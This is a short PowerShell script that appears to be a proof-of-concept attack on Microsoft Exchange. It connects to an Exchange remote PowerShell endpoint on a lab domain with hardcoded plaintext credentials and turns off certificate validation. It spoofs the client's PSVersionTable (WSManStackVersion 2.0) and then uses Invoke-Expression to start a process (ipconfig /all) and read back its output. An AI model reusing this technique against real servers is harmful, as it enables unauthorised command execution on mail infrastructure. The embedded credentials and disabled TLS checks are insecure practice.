$uri = "http://ex2016.t01.local/powershell"
$username = "testmail@t01.local"
$password = "TP1zzz23"
$secure = ConvertTo-SecureString $password -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $secure)
$version = New-Object -TypeName System.Version -ArgumentList "2.0"
$myTable = $PSVersionTable
$myTable["WSManStackVersion"] = $version
$option = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck -ApplicationArguments @{PSVersionTable=$myTable}
$sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck -ApplicationArguments @{PSVersionTable=$myTable}
$session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $uri -Credential $creds -Authentication Kerberos -AllowRedirection -SessionOption $sessionOption
Enter-PSSession -Session $Session


Invoke-Expression '$ps = New-Object System.Diagnostics.Process;$ps.StartInfo.FileName = "ipconfig";$ps.StartInfo.Arguments = "/all";$ps.StartInfo.RedirectStandardOutput = $True;$ps.StartInfo.UseShellExecute = $false;$ps.Start();[string] $Out = $ps.Standardoutput.ReadToEnd();$Out';
